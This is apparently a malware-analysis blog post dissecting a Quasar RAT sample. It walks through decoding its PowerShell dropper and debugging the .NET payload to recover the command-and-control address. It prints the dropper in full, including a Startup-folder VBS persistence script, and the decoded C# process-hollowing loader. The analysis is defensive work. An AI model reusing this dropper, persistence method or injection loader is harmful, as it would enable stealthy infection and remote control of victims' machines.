---
tags: RATs
---

## Quasar RAT - PowerShell Deobfuscation - .Net Debugging

Quasar RAT is a malware family written in .NET which is used by a variety of attackers, as it's fully functional and open source.

This specific sample is taken from [MalwareBazaar](https://bazaar.abuse.ch/download/98844e610a8d1e4800f8aee8d8464acc12d50f19c4025ffbf1759a899b5d66c4)

It involves decoding and extracting byte arrays from a PowerShell script. The executable is then debugged with DNSpy to reveal the C2 address.

## Initial PowerShell
``` powershell
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic
Add-Type -AssemblyName Microsoft.CSharp
Add-Type -AssemblyName System.Management
Add-Type -AssemblyName System.Web

[Byte[]] $RUNPE = @(31,139,8,0,0,0,0,0,4,0,237,189,7,96,28,73,150,37,38,47,109,202,123,127,74,245,74,215,224,116,161,8,128,96,19,36,216,144,64,16,236,193,136,205,230,146,236,29,105,71,35,41,171,42,129,202,101,86,101,93,102,22,64,204,237,157,188,247,222,123,239,189,247,222,123,239,189,247,186,59,157,78,39,247,223,255,63,92,102,100,1,108,246,206,74,218,201,158,33,128,170,200,31,63,126,124,31,63,34,214,77,177,188,72,95,95,55,109,190,56,252,141,19,255,207,241,211,34,187,88,86,77,91,76,155,238,87,175,214,203,182,88,228,227,179,101,155,215,213,234,117,94,95,22,211,28,205,126,227,100,153,45,242,102,149,77,243,244,69,222,158,151,197,187,223,56,249,197,191,113,146,210,179,90,79,202,98,154,78,203,172,105,210,47,170,203,34,151,207,245,107,60,63,94,231,23,69,181,76,63,122,221,214,235,105,219,124,228,190,250,158,124,244,60,187,174,214,237,150,252,248,189,138,229,108,252,58,255,69,235,156,240,201,202,81,250,50,155,190,77,63,75,119,222,237,222,249,190,123,117,85,23,151,89,155,167,13,67,72,95,214,21,33,219,156,45,207,171,122,145,181,212,159,107,234,225,194,111,10,202,117,158,205,170,101,121,157,210,128,95,182,181,129,240,237,108,57,43,243,195,91,189,242,102,142,79,110,245,198,186,88,58,36,103,221,198,58,150,176,181,64,15,26,255,146,159,13,210,189,110,179,186,93,175,222,131,116,140,222,235,226,7,189,65,119,199,65,61,128,195,94,229,13,113,83,62,219,189,101,251,167,121,243,182,173,86,183,108,253,166,104,123,228,255,222,23,89,221,204,179,242,184,217,250,106,185,200,150,217,69,62,123,115,189,202,199,79,174,127,146,62,173,235,236,122,196,35,56,169,150,77,203,36,218,219,191,243,253,126,31,147,235,54,255,222,247,211,47,138,102,122,19,58,202,20,102,176,123,183,108,255,186,157,157,45,87,235,246,246,205,191,92,183,239,213,254,180,174,171,58,206,69,63,158,47,103,34,158,16,115,251,169,145,216,227,151,103,190,180,62,45,203,179,197,170,170,219,173,143,222,230,245,50,47,239,237,141,103,101,249,17,145,50,39,78,108,90,238,137,168,73,140,149,199,57,142,248,107,154,230,239,72,197,44,133,141,136,92,235,69,46,188,190,165,56,207,229,207,59,135,62,82,223,116,239,147,170,42,211,239,86,87,159,238,211,235,210,33,49,67,75,223,26,52,90,254,112,148,18,154,196,2,83,249,242,135,128,212,255,219,240,97,34,125,254,255,50,164,254,95,132,15,216,248,39,11,210,161,164,89,202,178,154,158,190,179,140,204,166,129,145,73,179,25,73,90,211,200,31,101,190,188,104,231,242,123,75,122,73,126,91,213,85,155,79,127,150,177,149,41,173,139,54,87,115,244,69,190,168,234,107,131,242,74,62,20,132,38,89,147,31,27,188,85,21,78,214,231,231,121,173,223,243,239,208,163,35,82,60,231,242,25,53,107,0,191,205,151,63,132,145,188,162,217,126,207,129,88,76,111,51,18,192,31,30,198,178,37,252,63,100,12,232,231,167,174,96,163,86,63,89,228,87,95,158,191,38,6,32,221,123,211,40,126,8,148,61,33,65,178,76,114,188,165,214,54,91,173,200,5,96,55,225,5,121,133,35,99,133,167,213,130,236,236,236,121,177,164,207,66,228,143,91,106,50,89,19,49,237,55,34,165,222,23,161,49,227,254,139,229,60,39,54,18,247,138,94,101,115,49,5,82,212,247,179,50,187,112,224,242,229,101,81,87,203,5,249,61,14,161,117,93,211,223,79,139,154,40,74,124,33,243,218,119,118,48,116,243,145,180,233,251,146,102,36,222,71,152,0,131,238,13,86,244,105,94,230,23,68,74,223,243,53,116,159,233,119,17,146,255,254,230,189,31,145,126,152,244,113,58,118,141,131,35,229,77,86,98,51,220,168,37,252,166,128,247,52,89,15,240,55,172,210,6,209,25,82,74,183,70,232,70,232,161,185,236,193,253,250,118,243,134,249,235,153,189,91,15,233,107,219,191,65,140,122,238,111,159,12,206,15,222,60,174,174,199,248,77,177,100,212,61,126,127,224,113,253,184,146,96,82,45,207,101,85,204,82,202,65,24,101,247,38,171,47,242,246,101,134,217,86,202,191,204,174,203,138,200,225,64,116,194,83,16,180,64,48,215,137,141,174,230,69,153,167,91,69,250,56,189,239,189,29,129,128,7,80,48,32,102,22,14,13,187,240,240,196,180,25,250,94,230,87,145,239,182,124,114,152,39,166,236,12,136,254,119,81,16,77,49,6,247,209,75,52,57,151,121,221,142,223,84,95,209,180,220,219,219,210,8,152,191,255,242,124,11,210,82,157,111,245,81,187,115,39,6,184,173,175,251,31,70,136,133,39,110,181,188,143,117,76,3,214,45,244,51,98,200,224,41,206,211,173,223,213,53,221,242,249,67,88,102,124,186,88,181,215,198,48,141,127,138,178,88,157,63,206,179,178,33,73,165,9,149,103,63,253,25,252,113,32,127,117,26,47,215,101,41,82,221,20,242,115,85,220,233,112,143,121,6,8,131,135,132,163,186,226,225,159,190,155,230,171,193,153,196,227,5,230,254,3,134,60,39,14,86,77,68,212,124,82,180,58,223,121,77,51,46,19,174,226,129,241,221,59,25,36,35,68,100,65,233,144,39,164,218,110,132,228,247,250,9,224,238,111,128,235,100,95,231,27,159,237,188,123,114,239,251,3,239,104,107,106,179,243,125,201,82,209,44,116,211,38,230,193,252,235,252,8,199,227,133,253,247,159,143,65,235,237,190,81,244,135,237,124,247,155,33,162,224,97,190,181,47,108,173,138,177,159,53,28,89,117,57,48,18,60,27,70,131,231,125,56,12,207,0,151,13,124,156,147,200,188,55,145,55,251,73,157,175,149,220,55,248,86,209,175,111,36,124,248,214,255,247,168,15,113,205,39,239,136,68,78,88,246,30,14,9,84,199,101,25,180,93,120,134,189,205,206,87,58,61,27,188,211,222,87,27,117,120,216,26,83,162,127,153,57,193,120,161,108,14,68,235,6,62,24,137,188,124,106,13,244,207,145,74,166,145,120,106,244,179,192,249,125,111,132,54,250,218,254,183,58,23,155,125,243,216,183,55,9,138,247,78,100,70,252,193,165,191,43,115,213,255,155,5,166,97,143,231,12,211,243,222,22,238,254,206,38,203,41,144,191,77,188,151,215,55,219,225,30,236,65,235,201,206,118,70,193,208,213,151,4,172,46,102,64,156,189,149,129,23,6,226,167,224,115,101,150,161,80,43,252,124,211,168,9,202,153,231,50,248,47,70,152,197,138,197,200,159,8,246,74,216,201,34,17,30,166,49,177,98,216,219,38,102,251,217,21,241,13,177,98,247,59,99,193,54,68,151,253,239,54,42,201,78,243,8,153,125,50,141,76,104,100,72,174,28,250,255,14,85,9,185,17,45,244,229,249,121,147,195,59,236,74,198,179,131,1,152,205,156,114,154,228,138,47,38,121,109,149,89,92,242,118,63,29,150,188,79,135,112,166,40,136,20,57,97,120,198,97,35,253,120,220,235,141,62,253,228,147,247,39,29,160,94,170,168,220,210,113,15,201,4,196,7,253,120,211,131,204,247,171,236,234,105,214,102,210,193,123,117,176,59,40,139,166,135,85,69,255,230,245,155,234,3,58,25,84,124,220,9,49,124,56,140,15,53,49,154,47,80,68,20,105,48,49,127,17,244,53,228,74,153,231,9,103,120,198,79,72,215,189,61,169,86,215,110,152,93,186,216,129,203,31,52,128,224,147,241,115,78,93,109,34,4,158,175,33,253,68,226,144,207,58,152,244,145,232,233,133,247,146,115,60,3,178,142,167,51,253,188,180,62,36,222,3,96,116,254,148,194,49,166,35,151,254,9,53,106,2,107,241,129,26,213,243,59,189,158,227,62,231,123,17,12,82,164,89,204,47,207,79,151,148,90,121,9,248,55,10,82,87,139,237,29,108,26,97,224,62,220,233,26,109,107,149,7,32,120,225,197,201,247,69,90,124,6,139,160,191,1,149,111,34,78,31,204,58,186,111,84,168,135,243,147,221,111,110,12,23,237,11,255,223,139,20,191,126,156,62,76,233,240,107,63,78,31,166,121,244,235,27,9,31,190,245,255,61,234,71,211,248,230,211,111,219,16,58,150,235,247,63,221,36,223,6,88,151,56,119,32,98,219,187,239,47,97,239,67,145,200,176,35,31,209,218,228,116,222,255,120,0,7,85,191,208,229,250,235,147,235,179,217,150,75,100,139,58,116,138,250,108,118,231,206,248,247,42,202,114,16,77,176,73,177,92,199,148,92,4,221,226,147,79,34,13,39,68,218,183,157,207,189,151,245,87,250,241,75,254,31,31,153,47,8,105,41,0,0,0)

Function INSTALL() {
    [String] $VBSRun = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,79,98,106,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,79,98,106,46,82,117,110,32,34,80,111,119,101,114,83,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,82,101,109,111,116,101,83,105,103,110,101,100,32,45,70,105,108,101,32,34,32,38,32,34,37,70,105,108,101,80,97,116,104,37,34,44,32,48))
    [System.IO.File]::WriteAllText(([System.Environment]::GetFolderPath(7) + "\" + "SystemAutoRunner.vbs"), $VBSRun.Replace("%FilePath%", $PSCommandPath))
}

Function Decompress {
	[CmdletBinding()]
    Param (
		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray = $(Throw("-byteArray is required"))
    )
	Process {
        $input = New-Object System.IO.MemoryStream( , $byteArray )
	    $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo( $output )
        $gzipStream.Close()
		$input.Close()
		[byte[]] $byteOutArray = $output.ToArray()
        return $byteOutArray
    }
}

function CodeDom([Byte[]] $BB, [String] $TP, [String] $MT) {
$dictionary = new-object 'System.Collections.Generic.Dictionary[[string],[string]]'
$dictionary.Add("CompilerVersion", "v4.0")
$CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider($dictionary)
$CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters
$CompilerParametres.ReferencedAssemblies.Add("System.dll")
$CompilerParametres.ReferencedAssemblies.Add("System.Management.dll")
$CompilerParametres.ReferencedAssemblies.Add("System.Windows.Forms.dll")
$CompilerParametres.ReferencedAssemblies.Add("mscorlib.dll")
$CompilerParametres.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
$CompilerParametres.IncludeDebugInformation = $false
$CompilerParametres.GenerateExecutable = $false
$CompilerParametres.GenerateInMemory = $true
$CompilerParametres.CompilerOptions += "/platform:X86 /unsafe /target:library"
$BB = Decompress($BB)
[System.CodeDom.Compiler.CompilerResults] $CompilerResults = $CsharpCompiler.CompileAssemblyFromSource($CompilerParametres, [System.Text.Encoding]::Default.GetString($BB))
[Type] $T = $CompilerResults.CompiledAssembly.GetType($TP)
[Byte[]] $Bytes = [System.Web.HttpUtility]::UrlDecodeToBytes('%1f%8b%08%00%00%00%00%00%04%00%d4%bdy%7c%1b%c5%d98%be%da%5d%edJ%2b%c9%f6J%f6%cavl%cb9l%16%c9Nb%3b%04%27!%07%e1%2cGI%a0%80%1d%8e%84%04hc+K%a5%d0R%14%1bC%0b%b4%14%02%a1%1cm%b8%c3U%8er%96%b3%5c-P%ca%d5%8aP%0am%89%a1-%a5%27%ed%db%83%b6%94%e2%7c%9f%e7%99%99%9d%95%2c%13%d2%f7%fd%fd%f1%cb%27%d6%ce%f3%3c3%cf%3c%f3%3cs%3cs%ec%ec%c1%2b.V4EQt%f8%db%be%5dQ%1eR%d8%bf%25%ca%8e%ff%8d%c2_M%e6%91%1a%e5%db%d1%97%a6%3e%14%3a%e8%a5%a9%9f%fa%cc%daB%fb%a9y%ef%d3%f9%e3Ni_s%dc%bau%de%fa%f6%d5%27%b4%e7O%5b%d7%bev%5d%fb%de%87%1c%d6%7e%8aw%fc%093%13%09k%06%e7%b1l%1fE9(%a4)%bb%e8%7b%9f+%f8%be%a5%a8%a1X(%a2(%ab%c3%8a%12g%b8%1f%9e%05%e1v%11c%09%0b%abLnE%91O%e5%ad0%e1%15%22%2f9GQ%ea%e8%bf%7c%fa%0fV%06%e0%7b+%06%ae%83tV%95B%3e%19%16%22%ec%dc%3f%90%2f%12%00%23%00%ef%1f%80g%ae%3f%e1%f4%f5%f0%fc%f1q%bc%5c%ab%a5%dc%01%16%abf%e6%0b%f95%08X%01%19%8f%0f%97%c5%5b%02%ffg%e6O8%d9%5b%c3%d5%f5%24%e7%b5nB%bc%a5%95b%de%7d%16%8b%83%b2%a9JX%a9%bb%3e%a4%9c%fa%96Fu%22%a4(%c6UW%86%94%fd%c3%95%a9%26%ff%97%9a%ad1%7d%c2%3f%17%18X%8e%0b%92X.%f0%b3%ea%c7%0dx%18%05%b0%95%e5aQ%5c%1b%c0%aeF7%8c%0f%db%5d%10V%8cnk%04R%e9%de%12%08%bb%10%d1%c0%e4FVY7%82%c6%ee6%5d%13%d2u%19.%e8%d6%ca%3an%14%1f%98%e7B%26%af%ady%16F%98%e3%d6%1a%8aa%19n%0c%a1P%b6%00z%b1%3a%d2%5e%82%3dj%f0ax%b5(%03%d4%06%ab%93%e7%82%f2%87%94O%0a%f9%b7%02%8f%91%98%a6%e8%5d%16%3d%3cP%8e1%f2%0b%85%10%f8%f0%1e%40%04J%d6%d5L%0f%0fJd%b1P%12K%3c%8aA7d%10%f3)+%e7%ba%10%99%c6%1e%89%22!%0d%84%c2%19%c0%c3%1aI!%ac%00%dcUox_%00Tw%7c%24%828*%81%eadG+%a0%8f%c4%11%f5%3f%3a%e4Z%83%60%ad%1f%c3%cc%03%e7Ss%b5%84%ca%83%9eOuS(K%1d%c6%c0%90%5b%8f%3f%9f%85%1c%dc!%fcY%87%3fq%f8%e9%1c%b1%b1%00%f5%0cs*%fe4%40%d4y%0f%a0%0a%0cTA%12%e9%09%f7C%b4%8f%91v%0b%88%a34%e9%91%06%7c%d4Q%d2F%d7%81dcZ%e7%98%c2%a8sF%a6%e0%a3%5bJ%d9%3d%95%f1OC%b8%d0%88F%f0%9a%e0%b7q%95%d7%ec%27u0%cd%ec%11%b0%bd%de%d1%9d%ee%1c%81%a2%e8%e3F%04%2b%ce%14L1%8a%94B%0b3d%2bV%a56%f81%0a%8bA%baQ%ac%3b%e9%2c)%[Truncated]')
$Bytes = Decompress($Bytes)
try
{
[String] $MyPt = [System.IO.Path]::Combine([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory(),"AppLaunch.exe")
[Object[]] $Params=@($MyPt.Replace("Framework64","Framework") ,$Bytes)
return $T.GetMethod($MT).Invoke($null, $Params)
} catch { }
}
INSTALL
[System.Threading.Thread]::Sleep(1000)
CodeDom $RUNPE "Netflix.Movie" "Run"
```

The first interesting string appears to be byte code for a portable executable. 

The second appears to create a VBS script.

There's then a function referencing decompression, which appears to be Gzip.

The next interesting string is a very long URL-encoded byte array.

I'm going to start with the first byte array, which can be decoded and extracted simply by using a From Decimal and Gunzip operator.

This will reveal the following:

``` powershell
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Netflix
{
    public class Movie
    {
        #region "Structs"
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion

        #region "API"
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        #endregion

        #region "Delegates"
        private delegate bool CreateProcess_Delegate(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        private delegate bool GetThreadContext_Delegate(IntPtr thread, int[] context);
        private delegate bool Wow64GetThreadContext_Delegate(IntPtr thread, int[] context);
        private delegate bool ReadProcessMemory_Delegate(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int ZwUnmapViewOfSection_Delegate(IntPtr process, int baseAddress);
        private delegate int VirtualAllocEx_Delegate(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool WriteProcessMemory_Delegate(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate uint ResumeThread_Delegate(IntPtr hThread);
        private delegate bool SetThreadContext_Delegate(IntPtr thread, int[] context);
        private delegate bool Wow64SetThreadContext_Delegate(IntPtr thread, int[] context);
        #endregion

        public static void Run(string TargetPath, byte[] Payload)
        {
            int i = 0;
            while (i < 5)
            {
                int readWrite = 0x0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                try
                {
                    CreateProcess_Delegate CreateProc = new CreateProcess_Delegate(CreateProcessA);
                    if (!CreateProc(TargetPath, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi))
                    {
                        throw new Exception();
                    }
                    int fileAddress = BitConverter.ToInt32(Payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(Payload, fileAddress + 0x34);
                    int[] context = new int[0xB3];
                    context[0x0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    {
                        GetThreadContext_Delegate GetThread = new GetThreadContext_Delegate(GetThreadContext);
                        if (!GetThread(pi.ThreadHandle, context))
                        {
                            throw new Exception();
                        }
                    }
                    else
                    {
                        Wow64GetThreadContext_Delegate Wow64GetThread = new Wow64GetThreadContext_Delegate(Wow64GetThreadContext);
                        if (!Wow64GetThread(pi.ThreadHandle, context))
                        {
                            throw new Exception();
                        }
                    }
                    int ebx = context[0x29];
                    int baseAddress = 0x0;
                    ReadProcessMemory_Delegate ReadProcessMem = new ReadProcessMemory_Delegate(ReadProcessMemory);
                    if (!ReadProcessMem(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite))
                    {
                        throw new Exception();
                    }
                    if (imageBase == baseAddress)
                    {
                        ZwUnmapViewOfSection_Delegate ZwUnmapView = new ZwUnmapViewOfSection_Delegate(ZwUnmapViewOfSection);
                        if (ZwUnmapView(pi.ProcessHandle, baseAddress) != 0x0)
                        {
                            throw new Exception();
                        }
                    }
                    int sizeOfImage = BitConverter.ToInt32(Payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(Payload, fileAddress + 0x54);
                    bool allowOverride = false;
                    VirtualAllocEx_Delegate VirtualAlloc = new VirtualAllocEx_Delegate(VirtualAllocEx);
                    int newImageBase = VirtualAlloc(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
                    if (newImageBase == 0x0)
                    {
                        throw new Exception();
                    }
                    WriteProcessMemory_Delegate WriteProcessMem = new WriteProcessMemory_Delegate(WriteProcessMemory);
                    if (!WriteProcessMem(pi.ProcessHandle, newImageBase, Payload, sizeOfHeaders, ref readWrite))
                    {
                        throw new Exception();
                    }
                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(Payload, fileAddress + 0x6);
                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = BitConverter.ToInt32(Payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(Payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(Payload, sectionOffset + 0x14);
                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(Payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
                            if (!WriteProcessMem(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                        }
                        sectionOffset += 0x28;
                    }
                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMem(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite)) throw new Exception();
                    int addressOfEntryPoint = BitConverter.ToInt32(Payload, fileAddress + 0x28);
                    if (allowOverride) newImageBase = imageBase;
                    context[0x2C] = newImageBase + addressOfEntryPoint;
                    if (IntPtr.Size == 0x4)
                    {
                        SetThreadContext_Delegate SetThread = new SetThreadContext_Delegate(SetThreadContext);
                        if (!SetThread(pi.ThreadHandle, context))
                        {
                            throw new Exception();
                        }
                    }
                    else
                    {
                        Wow64SetThreadContext_Delegate Wow64SetThread = new Wow64SetThreadContext_Delegate(Wow64SetThreadContext);
                        if (!Wow64SetThread(pi.ThreadHandle, context))
                        {
                            throw new Exception();
                        }
                    }
                    ResumeThread_Delegate ResumeTH = new ResumeThread_Delegate(ResumeThread);
                    if (ResumeTH(pi.ThreadHandle) == -1)
                    {
                        throw new Exception();
                    }
                }
                catch
                {
                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                    continue;
                }
                i++;
                break;
            }
        }
    }
}
``` 

Within this script there are lots of references to injection APIs, indicating this is very likely going to be our loader.

The second array can be simply decoded with a From Decimal operator and reveals the following:

```
Set Obj = CreateObject("WScript.Shell")
Obj.Run "PowerShell -ExecutionPolicy RemoteSigned -File " & "%FilePath%", 0
```

The last, longest, URL-encoded string can be decoded to reveal an executable using the following CyberChef recipe:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e1c81006-928f-4863-956b-1ff2a84187a2)

We can then download the output to get our executable.

## Analysing the Executable

We can use a tool such as DetectItEasy or PE Detective to learn it is a .NET executable.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/31baf012-8484-40ec-8768-8f2f10f2ece8)

Knowing this - we can use DNSpy to interrogate the binary further, however, after following the entry point we quickly realise that the binary is heavily obfuscated.

This will make our analysis a lot more difficult.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/2600994a-708c-44b8-899e-19d766ee6983)

To overcome this, we can use a tool like De4Dot, which identifies and "cleans" obfuscated .NET binaries. This tool can be downloaded from [here](https://github.com/de4dot/de4dot)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/40b9706a-1afc-4417-bcfe-c2089f0bfd04)

De4Dot detects that the executable has been obfuscated, cleans it up, and outputs the cleaned version under a new file. We'll load this file back into DNSpy to see the results.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/50dbb051-72e2-4c79-950b-356d578f07e8)

Thankfully, it worked pretty well, the module and method names don't hold much meaning, but interrogating this binary will be a lot easier with this newer, cleaned version.

Malware typically loads configuration information shortly after the entry point, meaning we're probably not too far away from what we're interested in.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5fff0c0c-0ee9-4298-9089-3e544ff872ef)

We're going to dig deeper into smethod_0, as it's one of the first executed objects.

We can see that there are strings being defined with Base64 encoded text, which is a good indication that we are looking at configuration-related information. 

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d9b4ff72-d9ea-482a-bea3-507cf4720124)

As well as the method which is used to decrypt and obtain the data.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/ed76a929-6459-44db-a94f-e0ca0703f45d)

Rather than wasting time reversing this process, we can set a breakpoint and step over the functions to try and reveal important information.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b1d40550-d478-4dc8-b9b7-6f62624a322c)

Stepping over these functions we reveal the C2 address as: nathwood23[.]mysynology[.]net:6750

Stepping further, we get strong indications that this is related to the Quasar RAT.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/3223cda0-3619-4bc6-8da6-0d43f1d66b6b)

**All Decoded Strings:**

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/9e0a669d-5817-48bc-b1c5-f89a0b08be49)








